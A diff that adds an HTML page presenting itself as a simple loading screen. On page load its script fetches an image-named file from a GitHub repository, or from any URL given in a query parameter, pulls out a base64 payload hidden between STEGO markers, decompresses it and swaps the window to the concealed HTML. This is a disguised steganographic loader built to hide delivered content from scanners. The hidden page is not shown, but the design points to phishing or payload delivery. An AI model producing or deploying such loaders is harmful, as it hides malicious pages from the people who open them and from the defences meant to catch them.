@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #4285f4;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error {
+            text-align: center;
+            padding: 50px;
+            display: none;
+        }
+        .error h1 { color: #d93025; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="loader" id="loader"></div>
+    <div class="error" id="error">
+        <h1>Failed to Load</h1>
+        <p id="errorText"></p>
+    </div>
+
+    <script>
+        const contentUrl = new URLSearchParams(window.location.search).get('contentUrl') 
+            || 'https://raw.githubusercontent.com/anyb44254-wq/alwaerder/main/TTTRRRRRR.png';
+
+        (async function() {
+            try {
+                console.log('📥 Fetching:', contentUrl);
+
+                const res = await fetch(contentUrl, { cache: 'no-cache' });
+                if (!res.ok) throw new Error('HTTP ' + res.status);
+
+                const buffer = await res.arrayBuffer();
+                const text = new TextDecoder('latin1').decode(buffer);
+
+                const match = text.match(/STEGO_START\n([\s\S]*?)\nSTEGO_END/);
+                let html;
+
+                if (match) {
+                    console.log('🔐 Decoding...');
+                    const base64 = match[1];
+                    const binary = atob(base64);
+                    const bytes = new Uint8Array(binary.length);
+                    for (let i = 0; i < binary.length; i++) {
+                        bytes[i] = binary.charCodeAt(i);
+                    }
+                    const stream = new Blob([bytes]).stream();
+                    const decompressed = stream.pipeThrough(new DecompressionStream('gzip'));
+                    html = await new Response(decompressed).text();
+                    console.log('✅ Decoded:', html.length, 'chars');
+                } else {
+                    console.log('📄 Plain HTML');
+                    html = new TextDecoder('utf-8').decode(buffer);
+                }
+
+                const blob = new Blob([html], { type: 'text/html; charset=utf-8' });
+                const blobUrl = URL.createObjectURL(blob);
+
+                console.log('🎨 Blob URL:', blobUrl);
+
+                window.location.replace(blobUrl);
+
+            } catch (e) {
+                console.error('❌', e);
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('errorText').textContent = e.message;
+            }
+        })();
+    </script>
+</body>
+</html>
